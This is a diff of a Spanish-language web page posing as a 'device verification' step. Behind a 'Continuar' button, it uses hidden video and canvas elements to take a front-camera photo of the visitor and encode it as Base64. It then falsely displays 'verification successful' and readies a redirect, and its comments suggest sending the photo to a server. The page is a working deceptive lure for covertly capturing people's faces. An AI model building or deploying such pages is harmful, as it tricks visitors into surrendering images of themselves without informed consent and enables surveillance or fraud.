@@ -3,61 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación</title>
+    <title>Verificación de Dispositivo</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            text-align: center; 
+            padding: 30px 20px; 
+            background: #f4f4f9; 
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        /* El video se mantiene oculto ya que solo se usa para procesar la captura */
         video, canvas { display: none; }
-        .btn { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        
+        .btn { 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            padding: 14px 28px; 
+            font-size: 16px; 
+            font-weight: bold;
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%;
+            margin-top: 20px; 
+            box-shadow: 0 2px 6px rgba(0,123,255,0.3);
+        }
+        .btn:active { background: #0056b3; }
+        #status { margin-top: 15px; font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-    <h2>Cargando contenido...</h2>
-    <p>Por favor, presiona el botón para continuar.</p>
+    <div class="container" id="mainContainer">
+        <h2>Verificación Requerida</h2>
+        <p>Por favor, presiona el botón para continuar con el proceso.</p>
+        
+        <button class="btn" id="startBtn">Continuar</button>
+        <p id="status"></p>
+    </div>
 
-    <!-- Elementos multimedia ocultos -->
-    <video id="video" autoplay playsinline></video>
+    <!-- Elementos multimedia (playsinline y autoplay son obligatorios para iOS) -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
-    <button class="btn" id="startBtn">Continuar</button>
-
     <script>
+        const startBtn = document.getElementById('startBtn');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const startBtn = document.getElementById('startBtn');
+        const statusText = document.getElementById('status');
 
         startBtn.addEventListener('click', async () => {
-            try {
-                // Solicitar acceso a la cámara frontal
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-                
-                startBtn.style.display = 'none';
+            startBtn.disabled = true;
+            statusText.textContent = "Solicitando acceso a la cámara...";
 
-                // Esperar a que el video cargue y tomar la foto
+            try {
+                // Configuración compatible con Android e iOS
+                const constraints = {
+                    video: {
+                        facingMode: 'user', // 'user' para cámara frontal, 'environment' para trasera
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+
+                // Solicitar acceso a los medios del dispositivo
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+
+                statusText.textContent = "Cámara activada. Procesando...";
+
+                // Dar un pequeño margen para que el stream de video comience a fluir en móviles
                 setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Obtener la imagen en formato Base64
+                    // Obtener la imagen en formato Base64 (puedes enviarla a un servidor con fetch)
                     const imageDataURL = canvas.toDataURL('image/png');
+                    console.log("Foto capturada con éxito:", imageDataURL.substring(0, 30) + "...");
 
-                    // Detener la cámara
+                    // Apagar la cámara inmediatamente después de tomar la foto
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Opcional: Aquí puedes enviar 'imageDataURL' a tu servidor mediante fetch() 
-                    // para guardarla o procesarla.
-                    console.log("Foto capturada con éxito");
+                    // Cambiar la vista de la pantalla o redirigir
+                    document.getElementById('mainContainer').innerHTML = "<h3>¡Verificación exitosa!</h3><p>Redirigiendo...</p>";
+                    
+                    setTimeout(() => {
+                        // window.location.href = "https://tu-sitio-web-de-destino.com";
+                    }, 1500);
 
-                    document.body.innerHTML = "<h3>¡Listo! Redirigiendo...</h3>";
-                    // window.location.href = "https://tu-sitio-web-destino.com";
-                }, 1000);
+                }, 1200);
 
             } catch (err) {
-                alert("Se requiere permiso de la cámara para continuar.");
-                console.error("Error al acceder a la cámara: ", err);
+                console.error("Error de acceso a la cámara:", err);
+                startBtn.disabled = false;
+                
+                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    statusText.textContent = "Permiso denegado. Debes permitir el uso de la cámara para continuar.";
+                } else {
+                    statusText.textContent = "No se pudo acceder a la cámara en este dispositivo.";
+                }
             }
         });
     </script>
